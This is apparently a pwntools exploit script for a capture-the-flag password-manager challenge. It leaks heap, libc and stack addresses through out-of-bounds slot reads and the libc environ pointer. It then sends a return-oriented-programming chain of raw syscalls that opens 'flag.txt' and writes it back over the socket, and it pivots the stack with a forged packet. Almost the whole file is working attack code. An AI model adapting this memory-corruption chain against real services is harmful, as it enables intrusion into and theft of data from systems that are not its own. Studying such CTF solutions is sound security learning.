#!/usr/bin/env python2
#-*- coding: future_fstrings -*-
from pwn import *
# context.log_level = "debug"
def login(name):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":", name)
    
def signup(name):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", name)
    
def logout():
    p.sendlineafter("> ", "4")
    
def report(content, title):
    assert len(content) < 0x1000
    p.sendlineafter("> ", "4")
    p.sendafter(":", content), sleep(0.1)
    p.sendafter(":", title), sleep(0.1)

def add_pw(password, slot_id):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":", password)
    p.sendlineafter(":", str(slot_id))
    
def get_pw(slot_id):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", str(slot_id))
    
def del_pw(slot_id):
    p.sendlineafter("> ", "3")
    p.sendlineafter(":", str(slot_id))
    
if "remote" in os.environ:
    # p = remote("172.17.0.3", 1234)
    p = remote("flu.xxx", 10100)
else:
    p = process("./main")

signup("user")

login("user")
for i in range(10):
    add_pw("q" * (0xa0-7), i)
add_pw("w" * (0xa0-7), 11)

for i in range(10, -1, -1):
    del_pw(i)

get_pw(34)
p.recvuntil(": ")
heap_base = u64(p.recvline().rstrip().ljust(8, "\x00")) - 0xd20
print "heap_base", hex(heap_base)

add_pw("Q" * (0xa0-8) + p64(heap_base+0x7b0), 0)
get_pw(98)
p.recvuntil(": ")
libc_base = u64(p.recvline().rstrip().ljust(8, "\x00")) - 0x219ce0
print "libc_base", hex(libc_base)

environ = libc_base + 0x221200

logout()

report(''.join([
    "A" * 0x20, 
    p64(8), p64(environ), # use report (environ starts with null byte)
    "B" * 0x20
]).ljust(0x0f0, "!"), "Y" * 32)

login("user")
get_pw(36)
p.recvuntil(": ")
stack = u64(p.recvline().rstrip().ljust(8, "\x00"))
print "stack", hex(stack)
logout()


if "remote" in os.environ:
    leave_ret = libc_base + 0x4da83
    ret = leave_ret + 1
    system = libc_base + 0x000000000050d70
    libc_sleep = libc_base + 0x0000000000ea570
    rdi_r = libc_base + 0x2a3e5
    rax_r = libc_base + 0x45eaf
    rsi_r = libc_base + 0x2be51
    rdx_pr = libc_base + 0x1364cf
    rdx_r = libc_base + 0x796a2
    syscall_r = libc_base + 0x91316
    r12_r = libc_base + 0x35731
    rdi_gadget = libc_base + 0x199f0b
    # 0x199f0b: mov rdi, qword [rsi+rdx-0x08] ; sub rcx, rdi ; or rax, rcx ; cmovne eax, edx ; ret ; (1 found)

    # SOCK = 5 # ??
    
else:
    leave_ret = libc_base + 0x4da83
    ret = leave_ret + 1
    system = libc_base + 0x50d70
    rdi_r = libc_base + 0x2d8f2
    rax_r = libc_base + 0x45eb0
    rsi_r = libc_base + 0x2be51
    rdx_pr = libc_base + 0x1364cf
    syscall_r = libc_base + 0x91316
    SOCK = 3

def set_rdi_from_mem(mem):
    return ''.join([
        p64(rdx_r), p64(8), 
        p64(rsi_r), p64(mem),
        p64(rdi_gadget),
    ])

# pause()
report(''.join([
    p64(ret) * 0x40,
    ''.join([
        # p64(0xdeadbeefcafecafe),
        # p64(rdi_r), p64(10000),
        # p64(libc_base + 0x0000000000ea5e0), # sleep test
        # p64(rdi_r), p64(3),
        # p64(libc_sleep),
        
        # read(3, buf, 0x1000) - clear recv buf
        # set_rdi_from_mem(stack - 0x138), # socket fd saved on stack
        p64(rdi_r), p64(5), 
        p64(rax_r), p64(0),
        p64(rsi_r), p64(heap_base + 0x2000),
        p64(rdx_r), p64(0x1000), 
        
        p64(syscall_r),
        
        # p64(rdi_r), p64(1), 
        # p64(libc_sleep), # why .. ?????????????????????

        p64(rdi_r), p64(5),
        p64(rax_r), p64(0),
        p64(rsi_r), p64(heap_base + 0x2000),
        p64(rdx_r), p64(4),
        p64(syscall_r),

        p64(rdi_r), p64(5),
        p64(rax_r), p64(0),
        p64(rsi_r), p64(heap_base + 0x2000),
        p64(rdx_r), p64(4),
        p64(syscall_r),
        
        # write(3, &0, 1)
        p64(rdi_r), p64(5),
        p64(rax_r), p64(1),
        p64(rsi_r), p64(heap_base + 0x1540),
        p64(rdx_r), p64(1),
        p64(syscall_r),
        
        # write(3, &0, 1)
        p64(rdi_r), p64(5),
        p64(rax_r), p64(1),
        p64(rsi_r), p64(heap_base + 0x1540),
        p64(rdx_r), p64(2),
        p64(syscall_r),
        
        # 0 = open("flag.txt", 0)
        p64(rax_r), p64(2),
        p64(rdi_r), p64(heap_base+0x1530),
        p64(rsi_r), p64(0),
        p64(syscall_r),
        
        # read(0, buf, 100)
        p64(rax_r), p64(0),
        p64(rdi_r), p64(0),
        p64(rsi_r), p64(heap_base + 0x1550),
        p64(rdx_r), p64(100),
        p64(syscall_r),
        
        p64(rdi_r), p64(5),
        p64(rax_r), p64(0),
        p64(rsi_r), p64(heap_base + 0x2000),
        p64(rdx_r), p64(0xC),
        p64(syscall_r),
        
        # write(3, &status, 1)
        p64(rdi_r), p64(5),
        p64(rax_r), p64(1),
        p64(rsi_r), p64(heap_base + 0x1540),
        p64(rdx_r), p64(1),
        p64(syscall_r),
        
        # write(3, &len, 1)
        p64(rdi_r), p64(5),
        p64(rax_r), p64(1),
        p64(rsi_r), p64(heap_base + 0x1548),
        p64(rdx_r), p64(2),
        p64(syscall_r),
        
        # write(3, buf, 100) : flag
        p64(rdi_r), p64(5),
        p64(rax_r), p64(1),
        p64(rsi_r), p64(heap_base + 0x1550), 
        p64(rdx_r), p64(100),
        p64(syscall_r),
        
        p64(0xdeadbeefcafecafe)
    ]).ljust(0x600, "?"),
    # 0x1530
    "flag.txt".ljust(0x10, "\x00"),
    # 0x1540
    p64(0), # &status
    p64(100), # &len
    # 0x1550: flag
]).ljust(0xC00, "\x00"), "Y" * 30)


report(''.join([
    "A" * 0x40,
    
    # fake packet
    "X", "w" * (35 + 6),           # header (6 for padding)
    p64(stack - 0x3E8), # data
    "\x02",  # SRV_PARSE_DATA
    p64(heap_base + 0xF00), # stack pivoting
    p64(leave_ret),
]).ljust(0x0A40, "@"), "Y" * 32)

login("qwe")
get_pw(0x1337)
p.recvuntil("Password")
success(f"flag: {p.recvline()}")
# p.interactive()
p.close()
"""
gdb -p `pidof main | awk '{print $1}'`
"""
